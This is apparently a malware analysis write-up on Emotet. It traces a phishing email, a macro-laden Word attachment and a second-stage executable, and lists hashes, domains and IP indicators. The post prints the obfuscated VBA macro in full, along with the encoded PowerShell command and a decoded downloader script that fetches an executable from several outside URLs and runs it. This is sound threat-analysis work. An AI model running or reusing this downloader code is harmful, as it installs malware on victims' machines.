---
title: emotetAnalysisPart1
date: 2023-11-23
categories: [Malware Analysis , Reports]
tags: [TAG]     # TAG names should always be lowercase

---

**Emotet Unmasked: A Comprehensive Analysis of Infiltration Strategies — From Phishing to Corporate Intrusion, Document-Based Payloads, and Dynamic Communication with C&C Servers.**

![emotet](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/FpwgGb0X0AIWmKD.jpeg?alt=media&token=00fe7ebd-a024-4aa7-a4dc-9e9c214f89c2)
---
# Introduction 

Emotet is a sophisticated and notorious malware strain that initially emerged as a banking trojan but has since evolved into a multifaceted threat. It primarily spreads through malicious email attachments or links, often camouflaging itself as legitimate documents. Once infiltrated, Emotet can pilfer sensitive information, facilitate other malware infections, and enable unauthorized access to compromised systems.

We commence our analysis by scrutinizing the emails, delving into how they deceive users into opening them. Subsequently, we investigate the attached documents to discern how the malware conceals itself within. To comprehend its blueprint, we employ basic static analysis, decoding the structure and identifying key elements. Concurrently, basic dynamic analysis aids us in understanding how the malware behaves in action.

# Index 

1. Email Phishing Analysis 
2. Document Analysis 
3. Basic Static Analysis 
4. Basic Dynamic Analysis 


---
# Email Phishing Analysis 

> **Emotet Can Attack Your System Through Phishing Email or Phishing Document Attachment.**



![emotet phishing email](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/2023-11-22_19-42.png?alt=media&token=f9454df4-a8dd-4064-944d-35979c375de4)

![ee](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2022-33-37.png?alt=media&token=645b8d22-b34d-42d1-9c2c-cac525ddb1ef)


 > **Let's examine the first phishing email.**

 >1. sara[.]buller@ottumwaschools[.]com 
 >2. management@bavarianmotorcars[.]com
 >3. hxxp[://]bengalcore[.]com/Invoice-26396-reminder/



>**The First Two Domains Are Clean** 

![emotet12](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/12.png?alt=media&token=9ae80d8f-ad61-4a76-9cf3-8e67f682d951)

![emotet13](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/13.png?alt=media&token=2ef72e28-08f5-4ccf-9667-52cea78e4eb8)

> **Let's See The Third Domain**

![emotetHTTP](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot.png?alt=media&token=57af02ba-9178-423c-93e2-dd8a2f428503)

> **We can confirm that this domain is malicious; our analysis will now focus on document analysis.**


---
# Document Analysis 

> **I have a Word document attachment. Here are the hashes:**
> 
> **md5 >> 02E3887DB869113CB223D9EBD9C6117F**
> 
> **sha1 >> 6C43C961756DBCFFCE0E26E09F97DE6775B217ED**
> 
> **sha256>>E77FF24EA71560FFCB9B6E63E9920787D858865BA09F5D63A7E44CB86A569A6E** 

![doc](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2022-48-55.png?alt=media&token=817ed000-7d38-41b1-99cf-cff74420c5cb)

> **47 vendors have identified it as malicious, with some specifically flagging it as Emotet or a Trojan.** 

![vendors](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2022-51-08.png?alt=media&token=5d0d31ca-4214-46d6-9e58-ca542a6798b8)

> **First, I ran the document through olevba and Oleid, both of which identified the document as malicious. They revealed the macros and indicated that the macros are highly obfuscated.** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2000-16-41.png?alt=media&token=adc19a8a-9b3f-4e1f-9804-7503a2d9d226)

> **And Here The Macro Inside It** 

```
Sub FMGAn24cV()
   On Error Resume Next
   Select Case cFmIw
      Case 8059
         wUhL25 = 2636
         GpzXy = Jlzd789p
         UWiZ = 482
      Case 6364
         HfiuK0K8 = XiLc
         shtE = Round(RQUnj832I + ChrB(tGjztO8))
         huYs7195 = Int(252065587 * 127 * 204048515 + CLng(IBL))
      Case 46
         IKWt3M788 = Fix(cTuwVw8 * CByte(BLux6x4G / Tan(29285969)) * 709 * zDNle7)
         YwAYF = odu
         CZk = CStr(278725002)
   End Select
   Set xjQY96L = 3
End Sub
 Sub vgYJ(kHiis167)
   On Error Resume Next
   Dim jfjyp146z()
   ReDim jfjyp146z(2)
   jfjyp146z(0) = 441
   jfjyp146z(1) = 14
   yYzpN2 = (GMOz7Gjx / CDate(XIsh) * XKEimT1 + 7391 * (9 - CStr(15 * CStr(1)) * 204179029 / Round(SIi)))
   sVS = tRTKlgHp - 147619628
End Sub

Sub autoopen()
ukWWdsK
End Sub
Sub FHjEj(LAcQVZ87)
   On Error Resume Next
   Do
      Dim lJeuDE96, nqrjpo6
      neGow086 = 4163
      AkQCgA = 294325181 - 51502176
   Loop Until bwvS69z8z >= 13
   Do While JKyP8pxto Eqv 10
      For Each ZJyu In NBZq5Y
         oYwx = UlaI61M1 / fph * 498373131 / vrGbz * (86 * CDate(4003) * (93 + Int(Lyrs) / 28188549 - ChrW(hlpn60H)))
      Next
      Set vRSb9W = 3
      Select Case tJBR
         Case 407850943
            jaum6Cn = ChrB(3641 * Hex(EzHUi2E))
            NCskA = CjuvT
            rSZ = CBool(Act)
         Case 1
            crvr = 368
            xgQY = ocXUh23
            QXvYq42qV = xzak9Z2
         Case 513122720
            vLZp = ChrB(233198461)
            eObu66H03 = 8
            vxQ = 385391781
      End Select
      Set ZWbLW1X89 = DzyG
   Loop
End Sub
 Sub sSYfU0(SpsW4rP)
   On Error Resume Next
   XtaW = 252633654 - Rnd(JHd / Chr(RzwyI3)) * 582 - CSng(67 / 61 + UuzY46cs5 - CStr(404047675)) / 67 * RJpk5xi38 / 271545299 + CStr(77 + CByte(13 - Atn(64 - mTgJ * 284735532 / 32)) - 43 - CLng(ZdgH93I))
   YSuN0x5D = 229040495 / 36292429
   zFcxbS = (8 / CStr(UEi) + (ZRhr + jKDn0 - 14 / GDs * (EYA * CSng(345020765 * bQZ) - SsI / Cos(uAwx3Vije))))
End Sub

Public Function ukWWdsK()
On Error Resume Next
VBA.Shell$ "" + UWbfkwStSfN + TsvdGtsXy + CEksYkDDLPC + muCnTNfaDz + NHPPYeuBF + NhBKxbvDSCU + BHhpVSH + WwUHnAzPHH + ugxkHRTHwC + vfFPPPnCUf + ActiveDocument.CustomDocumentProperties("ZpEkWFg") + UWbfkwStSfN + TsvdGtsXy + CEksYkDDLPC + muCnTNfaDz + NHPPYeuBF + NhBKxbvDSCU + BHhpVSH + WwUHnAzPHH + ugxkHRTHwC + vfFPPPnCUf + ActiveDocument.BuiltInDocumentProperties("Comments") + UWbfkwStSfN + TsvdGtsXy + CEksYkDDLPC + muCnTNfaDz + NHPPYeuBF + NhBKxbvDSCU + BHhpVSH + WwUHnAzPHH + ugxkHRTHwC + vfFPPPnCUf + ZzNNgAY, 0
End Function
Sub JMQObR0()
   On Error Resume Next
   Lphmp5 = MDxY8q2 * uvPIG51Hm
   Uvcq = 314659417 * 465999738
End Sub
 Sub wXFp7reR9()
   On Error Resume Next
   Do While kcJf > lkPIt4
      For Each GIyl In OvCk
         PLPbA5 = Cos(188802468)
      Next
      For Each MqSKJ6f In ORvWe4F5
         noUx84A = 598
      Next
      For qiUPL4Ycs = cinf02 To DJpsd633
         FcHCQ5Ol = 531668891 * Chr(tWAv7fc2 / 401 - oOnx * Hex(22 + Log(238889098))) * yqAGY + Atn(URVKDhE26) * 933 / Fix(OUEk5 * Sin(193) - 9312 - Round(gXeSX11e)) * 699 - Round(lEol06) + 1648 - Round(299506984)
      Next
      Do
         cgXl1L = PVFdrkie * Int(7) * ZPWvW0 / Cos(6789) - 9 + Tnbf086
      Loop Until xbKi8920 > 6
      EFRQ1 = 334953148 * wLRi7
   Loop
   RSFC2F12 = mcgVq3X - 251107387
End Sub
```
> **Now, let's open the document. We can observe a phishing message prompting the user to enable the macro.**


![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2022-58-20.png?alt=media&token=8bc6460e-3bfd-4d91-8ef6-5f7d207b3c3d)

> **I will open FakeNet-NG and Process Explorer, then run the document to observe its behavior.** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2023-02-44.png?alt=media&token=7e4f2991-cdbc-4c34-aaa9-f767b109345b)

> **I've identified a PowerShell command and observed communication with a specific domain. We will examine the PCAP later; let's begin by analyzing the PowerShell command.**

> **The PowerShell Command Path is "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"**  

```powershell
powershell -e IABbAHMAdAByAGkAbgBHAF0AOgA6AGoAbwBJAE4AKAAgACcAJwAgACwAKAAgACcAMwA2AEAAMQAxADkAJgAxADEANQAmADkAOQBEADEAMQA0AFkAMQAwADUAPgAxADEAMgBZADEAMQA2AH4AMwAyAH0ANgAxAEQAMwAyAEAAMQAxADAAdwAxADAAMQB3ADEAMQA5AHsANAA1ACYAMQAxADEAfQA5ADgAewAxADAANgB9ADEAMAAxAEAAOQA5AGsAMQAxADYARAAzADIAewA0ADUAQAA2ADcAQAAxADEAMQAmADEAMAA5AD4ANwA5AHcAOQA4AGsAMQAwADYARAAxADAAMQBEADkAOQA+ADEAMQA2ACYAMwAyAGsAOAA3AHsAOAAzAD4AOQA5AHcAMQAxADQARAAxADAANQB7ADEAMQAyAEAAMQAxADYAfQA0ADYAJgA4ADMARAAxADAANAA+ADEAMAAxAH0AMQAwADgAfQAxADAAOABrADUAOQBAADMANgB3ADEAMQA5AGsAMQAwADEAfQA5ADgAewA5ADkAQAAxADAAOABrADEAMAA1AGsAMQAwADEAQAAxADEAMAB7ADEAMQA2AHsAMwAyAHsANgAxAFkAMwAyAEAAMQAxADAAfgAxADAAMQBAADEAMQA5AD4ANAA1AEAAMQAxADEAJgA5ADgAawAxADAANgA+ADEAMAAxAFkAOQA5AFkAMQAxADYAfgAzADIAQAA4ADMAQAAxADIAMQBZADEAMQA1AFkAMQAxADYAJgAxADAAMQB+ADEAMAA5AH4ANAA2AH0ANwA4AFkAMQAwADEAWQAxADEANgBEADQANgBAADgANwBAADEAMAAxAEQAOQA4AH0ANgA3AH4AMQAwADgAQAAxADAANQB3ADEAMAAxAEAAMQAxADAAJgAxADEANgAmADUAOQB9ADMANgA+ADEAMQA0AH0AOQA3AH4AMQAxADAAQAAxADAAMAB+ADEAMQAxAD4AMQAwADkAWQAzADIAfgA2ADEAWQAzADIAQAAxADEAMAB3ADEAMAAxAD4AMQAxADkAQAA0ADUAQAAxADEAMQB7ADkAOABAADEAMAA2AEAAMQAwADEAawA5ADkAPgAxADEANgBrADMAMgB3ADEAMQA0AHcAOQA3AH4AMQAxADAAdwAxADAAMAB+ADEAMQAxAH0AMQAwADkAewA1ADkAJgAzADYAJgAxADEANwBEADEAMQA0AD4AMQAwADgAfgAxADEANQB+ADMAMgAmADYAMQBrADMAMgB3ADMAOQB7ADEAMAA0AD4AMQAxADYARAAxADEANgB3ADEAMQAyACYANQA4AD4ANAA3AHsANAA3AEAAMQAwADIAQAAxADEAMQBAADkAOQBZADkANwA+ADEAMAA4AFkAOQA3AFkAMQAxADcAWQAxADAAMAAmADEAMAA1AD4AMQAxADEAQAAxADAAMABAADEAMAAxAGsAMQAxADUAfgAxADAANQB3ADEAMAAzACYAMQAxADAAawA0ADYAWQA5ADkAfgAxADEAMQBZADEAMAA5AHcANAA3AH4AMQAwADQAdwAxADAAOAB7ADQANwA+ADQANAB9ADEAMAA0ACYAMQAxADYAJgAxADEANgBAADEAMQAyAFkANQA4AH4ANAA3AHsANAA3ACYAMQAwADIAawAxADEANwB9ADEAMQA0AH4AMQAxADUAawAxADEANgBAADEAMAAxAFkAMQAxADAAJgAxADEANQB3ADQANgB7ADEAMQA1AFkAMQAwADEAPgA0ADcAewAxADEANQB7ADEAMAAwAGsAMQAyADAAfgA2ADcAfgAxADAAMQB9ADEAMAAzACYAMQAxADMAewA3ADIAawA5ADcAPgA0ADcAewA0ADQAfgAxADAANABAADEAMQA2AH4AMQAxADYAPgAxADEAMgBrADUAOAB9ADQANwBZADQANwA+ADEAMAAyAD4AMQAwADUAPgAxADEANAB+ADEAMQA1AGsAMQAxADYAWQAxADEANAB9ADEAMAAxAEAAMQAxADIAWQAxADEAMQBEADEAMQA0AD4AMQAxADYAQAA0ADYAewA5ADkAfQAxADEAMQA+ADEAMAA5AHcANAA3AEAAMQAxADgARAAxADEANQA+ADcAMwB3ADcAMAB9ADcANQAmADcAMAAmADQANwAmADQANAA+ADEAMAA0AEAAMQAxADYAQAAxADEANgBZADEAMQAyAGsANQA4AHcANAA3AEQANAA3AFkAMQAxADUAfQA5ADcAewAxADEANAB3ADkANwB3ADEAMAA0AEAAOQA4AEQAMQAxADQAfgA5ADcAfQAxADAAMABrADEAMAA4AEQAMQAwADEAPgAxADIAMQB7ADQANgB3ADkAOQB9ADEAMQAxAEAAMQAwADkARAA0ADcAewA4ADcAPgA4ADYAfQAxADAAMgB7ADcANABrADcAMgBEADgAMwBAADcAMAB+ADQANwA+ADQANAA+ADEAMAA0AHcAMQAxADYAfgAxADEANgBZADEAMQAyAH0ANQA4AH4ANAA3AD4ANAA3AHcAOQA4AH4AMQAwADEAWQAxADAAOAB7ADEAMQAxAD4AMQAxADAAdwAxADAAMwBrADEAMAA1AEQAMQAxADAAWQAxADAAMwB3ADEAMQA1AFkANAA2AH4AOQA5ACYAMQAxADEAfQAxADAAOQB7ADQANwBAADEAMAA4AGsAOAAxAEQAMQAwADEAJgAxADAAOAB+ADcAMABrADQANwB7ADMAOQB7ADQANgA+ADgAMwB3ADEAMQAyAEAAMQAwADgAJgAxADAANQB9ADEAMQA2AEAANAAwAH4AMwA5AEAANAA0AFkAMwA5AGsANAAxAHsANQA5AEAAMwA2AH0AMQAxADAAfgA5ADcAPgAxADAAOQBEADEAMAAxAHsAMwAyAH0ANgAxAD4AMwAyAGsAMwA2ACYAMQAxADQAJgA5ADcAewAxADEAMABEADEAMAAwAFkAMQAxADEAewAxADAAOQB7ADQANgBAADEAMQAwAHsAMQAwADEAQAAxADIAMAAmADEAMQA2AHsANAAwAEQANAA5AEAANAA0AHsAMwAyAH4ANQA0AHsANQAzAHsANQAzAGsANQAxAD4ANQA0AHsANAAxAH4ANQA5AHcAMwA2AD4AMQAxADIAPgA5ADcAdwAxADEANgAmADEAMAA0AH4AMwAyAHsANgAxAHcAMwAyAHsAMwA2AFkAMQAwADEAWQAxADEAMAB3ADEAMQA4AEQANQA4AGsAMQAxADYAewAxADAAMQBrADEAMAA5AHcAMQAxADIAQAAzADIAfQA0ADMAfQAzADIAewAzADkAawA5ADIAQAAzADkAWQAzADIAJgA0ADMAawAzADIAQAAzADYAdwAxADEAMABrADkANwB3ADEAMAA5AGsAMQAwADEAdwAzADIAewA0ADMAfgAzADIAfQAzADkAdwA0ADYAdwAxADAAMQBrADEAMgAwAFkAMQAwADEARAAzADkAdwA1ADkAJgAxADAAMgA+ADEAMQAxAFkAMQAxADQAWQAxADAAMQBEADkANwBEADkAOQB+ADEAMAA0AH4ANAAwAH0AMwA2ACYAMQAxADcAfgAxADEANAA+ADEAMAA4AH4AMwAyAH4AMQAwADUAdwAxADEAMABAADMAMgA+ADMANgBEADEAMQA3AEAAMQAxADQAJgAxADAAOAAmADEAMQA1AH0ANAAxAEAAMQAyADMARAAxADEANgBAADEAMQA0AH4AMQAyADEAJgAxADIAMwB7ADMANgA+ADEAMQA5AH4AMQAwADEAewA5ADgAJgA5ADkAewAxADAAOAA+ADEAMAA1AHcAMQAwADEAfQAxADEAMAAmADEAMQA2AFkANAA2AHcANgA4ACYAMQAxADEAewAxADEAOQBEADEAMQAwAH4AMQAwADgAPgAxADEAMQBrADkANwB3ADEAMAAwAH4ANwAwAHcAMQAwADUAdwAxADAAOAB+ADEAMAAxAH0ANAAwAH4AMwA2AHcAMQAxADcAJgAxADEANAB3ADEAMAA4AD4ANAA2ACYAOAA0AFkAMQAxADEAdwA4ADMAWQAxADEANgB7ADEAMQA0AD4AMQAwADUAWQAxADEAMAB3ADEAMAAzAFkANAAwAFkANAAxAEQANAA0AEQAMwAyAGsAMwA2AD4AMQAxADIAewA5ADcAPgAxADEANgA+ADEAMAA0AFkANAAxAFkANQA5AHsAOAAzAGsAMQAxADYAawA5ADcARAAxADEANAB3ADEAMQA2AHcANAA1AHcAOAAwAEQAMQAxADQAPgAxADEAMQBZADkAOQB7ADEAMAAxAHcAMQAxADUAdwAxADEANQB3ADMAMgB3ADMANgAmADEAMQAyAHsAOQA3ACYAMQAxADYAdwAxADAANABEADUAOQBAADkAOABZADEAMQA0ACYAMQAwADEARAA5ADcAewAxADAANwBAADUAOQB9ADEAMgA1AFkAOQA5AD4AOQA3AGsAMQAxADYAPgA5ADkAdwAxADAANABrADEAMgAzAEAAMQAxADkAdwAxADEANAA+ADEAMAA1AH4AMQAxADYAPgAxADAAMQBEADQANQB+ADEAMAA0AEQAMQAxADEAJgAxADEANQAmADEAMQA2ACYAMwAyAGsAMwA2AEAAOQA1AHsANAA2AGsANgA5AGsAMQAyADAAWQA5ADkARAAxADAAMQBAADEAMQAyAEAAMQAxADYAJgAxADAANQB9ADEAMQAxAH0AMQAxADAAPgA0ADYAewA3ADcARAAxADAAMQB7ADEAMQA1ACYAMQAxADUAJgA5ADcAQAAxADAAMwBEADEAMAAxAGsANQA5AH0AMQAyADUAdwAxADIANQAnAC4AUwBQAEwAaQB0ACgAIAAnAFkAdwB7AH4ARABrAD4AfQAmAEAAJwAgACkAfAAgAEYAbwByAEUAQQBjAEgALQBvAGIAagBlAEMAVAB7ACAAKAAgAFsAYwBIAEEAUgBdAFsASQBOAFQAXQAgACQAXwApAH0AIAApACkAfAAgAGkARQBYAA0ACgA=
```

> **We observe a heavily obfuscated PowerShell command. Let's de-obfuscate it using PowerShell.** 

![cyber shef](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2023-15-36.png?alt=media&token=795fba8f-3c99-4630-806b-1551ed7e75ef)

```powershell
 [strinG]::joIN( '' ,( '36@119&115&99D114Y105>112Y116~32}61D32@110w101w119{45&111}98{106}101@99k116D32{45@67@111&109>79w98k106D101D99>116&32k87{83>99w114D105{112@116}46&83D104>101}108}108k59@36w119k101}98{99@108k105k101@110{116{32{61Y32@110~101@119>45@111&98k106>101Y99Y116~32@83@121Y115Y116&101~109~46}78Y101Y116D46@87@101D98}67~108@105w101@110&116&59}36>114}97~110@100~111>109Y32~61Y32@110w101>119@45@111{98@106@101k99>116k32w114w97~110w100~111}109{59&36&117D114>108~115~32&61k32w39{104>116D116w112&58>47{47@102@111@99Y97>108Y97Y117Y100&105>111@100@101k115~105w103&110k46Y99~111Y109w47~104w108{47>44}104&116&116@112Y58~47{47&102k117}114~115k116@101Y110&115w46{115Y101>47{115{100k120~67~101}103&113{72k97>47{44~104@116~116>112k58}47Y47>102>105>114~115k116Y114}101@112Y111D114>116@46{99}111>109w47@118D115>73w70}75&70&47&44>104@116@116Y112k58w47D47Y115}97{114w97w104@98D114~97}100k108D101>121{46w99}111@109D47{87>86}102{74k72D83@70~47>44>104w116~116Y112}58~47>47w98~101Y108{111>110w103k105D110Y103w115Y46~99&111}109{47@108k81D101&108~70k47{39{46>83w112@108&105}116@40~39@44Y39k41{59@36}110~97>109D101{32}61>32k36&114&97{110D100Y111{109{46@110{101@120&116{40D49@44{32~54{53{53k51>54{41~59w36>112>97w116&104~32{61w32{36Y101Y110w118D58k116{101k109w112@32}43}32{39k92@39Y32&43k32@36w110k97w109k101w32{43~32}39w46w101k120Y101D39w59&102>111Y114Y101D97D99~104~40}36&117~114>108~32~105w110@32>36D117@114&108&115}41@123D116@114~121&123{36>119~101{98&99{108>105w101}110&116Y46w68&111{119D110~108>111k97w100~70w105w108~101}40~36w117&114w108>46&84Y111w83Y116{114>105Y110w103Y40Y41D44D32k36>112{97>116>104Y41Y59{83k116k97D114w116w45w80D114>111Y99{101w115w115w32w36&112{97&116w104D59@98Y114&101D97{107@59}125Y99>97k116>99w104k123@119w114>105~116>101D45~104D111&115&116&32k36@95{46k69k120Y99D101@112@116&105}111}110>46{77D101{115&115&97@103D101k59}125w125'.SPLit( 'Yw{~Dk>}&@' )| ForEAcH-objeCT{ ( [cHAR][INT] $_)} ))| iEX
```
> **I will attempt to de-obfuscate the command.** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2000-28-04.png?alt=media&token=29f00ac5-18f0-47f6-a9e6-ceae5d4b9e30)

> **I requested ChatGPT to analyze and explain it, and here are the results:**

```powershell
$wscript = New-Object -ComObject WScript.Shell
$webclient = New-Object System.Net.WebClient
$random = New-Object Random
$urls = 'http://focalaudiodesign.com/hl/', 'http://furstens.se/sdxCegqHa/', 'http://firstreport.com/vsIFKF/', 'http://sarahbradley.com/WVfJHSF/', 'http://belongings.com/lQelF/'.Split(',')
$name = $random.Next(1, 65536)
$path = $env:temp + '\' + $name + '.exe'

foreach ($url in $urls) {
    try {
        $webclient.DownloadFile($url.ToString(), $path)
        Start-Process $path
        break
    } catch {
        Write-Host $_.Exception.Message
    }
}

The provided PowerShell script seems to be a downloader script that downloads an executable file from one of the specified URLs and then executes it. Here's a deobfuscated version of the script:

    $wscript = New-Object -ComObject WScript.Shell: Creates a new instance of the WScript.Shell COM object, which can be used to run commands in the Windows Script Host environment.

    $webclient = New-Object System.Net.WebClient: Creates a new instance of the System.Net.WebClient class, which is used for downloading files from the Internet.

    $random = New-Object Random: Creates a new instance of the Random class to generate a random number.

    $urls = 'http://focalaudiodesign.com/hl/', ...: Defines an array of URLs to download the executable file from.

    $name = $random.Next(1, 65536): Generates a random number between 1 and 65535 to use as part of the file name.

    $path = $env:temp + '\' + $name + '.exe': Constructs the full path for the downloaded executable file in the temporary directory.

    The script then iterates through each URL in the $urls array, attempts to download the file using $webclient.DownloadFile, and then executes the downloaded file using Start-Process. If the download or execution fails, an error message is displayed using Write-Host.
```
> **Now, it's evident that this script downloads the second stage of the malware.** 

> **Now, let's examine the PCAP file we obtained from FakeNet.** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-24%2023-50-03.png?alt=media&token=47455f29-8cf0-4425-bfa8-95de8749bac9)



> **I Found Those domain** 
> 1. focalaudiodesign.com
> 2. furstens.se 
> 3. firstreport.com 
> 4. sarahbradley.com 
> 5. belongings.com 
> 6. percalabia.com 

> **I will scan each of them and provide a comprehensive list of Indicators of Compromise (IOC).** 

>1. 173.254.14.237
>2. 66.147.242.93
>3. 107.154.147.22
>4. 45.60.97.22
>5. 96.45.82.126 
>6. 96.45.82.249 
>7. 96.45.83.51 
>8. 96.45.83.150
>9. 213.146.173.150
>10. 213.146.173.149
>11. 64.41.86.47
>12. 5.187.0.158 
>13. 46.148.26.11 
>14. 109.234.35.121 
>15. ns63.worldnic.com
>16. ns64.worldnic.com
>17. focalaudiodesign.com
>18. mail.focalaudiodesign.com 
>19. ns1.bluehost.com
>20. ns2.bluehost.com


![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2000-03-19.png?alt=media&token=239c81c6-d083-435f-9f9d-c4f7a575ebdb)

https://www.virustotal.com/gui/domain/focalaudiodesign.com/relations

https://www.virustotal.com/gui/domain/furstens.se/relations

https://www.virustotal.com/gui/domain/firstreport.com/relations

https://www.virustotal.com/gui/domain/sarahbradley.com/relations

https://www.virustotal.com/gui/domain/belongings.com/relations

---

# Basic Static Analysis 

> **We will begin analyzing the sample that was downloaded by the command.** 
>
> **Here Are The Hashes :**
>
> **md5 >> D09A466039FFE16E231A202BD6259DB8**
> 
> **sha1 >> A625728EC40BD353B79913BED4DEE0C297467D3D**
> 
> **sha256 >> 591D32AEAE0554F744DF8843727E794D33495FF0A4B90A9F7861AB526988DED7**



![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2001-41-22.png?alt=media&token=7b01163a-b7b9-4a75-8bd4-d3aad74f92f6)

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2001-43-35.png?alt=media&token=eec6b81f-96c2-4249-a686-4557fe5f105a)

> **First, let's check if the sample is packed. I observed high entropy, and the packer identifier tools provided different outputs, indicating that the sample is likely packed.** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2001-46-42.png?alt=media&token=dd7a2494-dd4a-4287-a5ba-a332e8a94ae5)

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2001-46-52.png?alt=media&token=8ab492e6-ff05-4f48-8ea9-3daf84755ea2)

> **file-size,58880 bytes**

> **file-type,executable**

>  **cpu,32-bit**

> **Entropy 6.805** 

> **compiler-stamp,Mon Sep 30 18:18:17 2019**

> **let's Check Section Fileds , I  found .CRT Section I haven't Seen It before let's ask GPT For It** 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2001-49-38.png?alt=media&token=fae10896-1718-493d-a7af-4b6aea1dc363)

```
The ".CRT" section is a notable component within the executable file format used by Microsoft Windows, particularly in the Portable Executable (PE) format. PE serves as the executable file format for Windows applications, DLLs (Dynamic Link Libraries), and various file types.

Specifically, the ".CRT" section is closely tied to the initialization of the C runtime environment. In C and C++ programming languages, the C runtime (CRT) encompasses essential routines and data structures vital for a program's proper execution. This includes functions for managing memory allocation, exception handling, and other runtime tasks.

Throughout the compilation and linking stages, the compiler and linker generate code and data that necessitate execution or initialization before the program starts running. This initialization code and data often find their place in the ".CRT" section of the executable file.

It's worth noting that the specifics can vary depending on the compiler and toolchain in use. Different compilers and linkers might adopt distinct naming conventions or structures for these sections. A comprehensive understanding typically involves consulting the documentation specific to the toolchain and compiler applied in a given project.
```
> **So It's Something related with c/c++**


---
# Basic Dynamic Analysis 

> **Let's run the sample and gather some information about it. Initially, I executed the sample with Process Hacker running, and I observed that the sample deletes itself and spawns another process named "shlphans.exe."**

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2002-41-59.png?alt=media&token=9742ebdc-a686-4969-93b2-bf3dcb84dd7a)

> **The Path For The New Process Is** : 
```
C:\Windows\SysWOW64\shlphans.exe
```
> **I Scanned This Process and It's The Same As Original Sample thats mean the malware copy it self**

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2002-47-50.png?alt=media&token=67584585-d8d3-48ec-b7d8-3c8ea8912997)

> **I went to the Handles tab and obtained some information.**

> Event >> \BaseNamedObjects\E689B0777

> Mutant >> \BaseNamedObjects\M689B0777

> Section, \BaseNamedObjects\F932B6C7-3A20-46A0-B8A0-8894AA421973, 0x358


> And A lot of Registry Opened seems related for internet 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2002-55-36.png?alt=media&token=b23fb4cb-7488-4caa-8d88-ec74f3bf73eb)

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/Screenshot%20from%202023-11-25%2002-55-51.png?alt=media&token=0aa95fab-4537-4f4f-b61f-9fafbfda0d0a)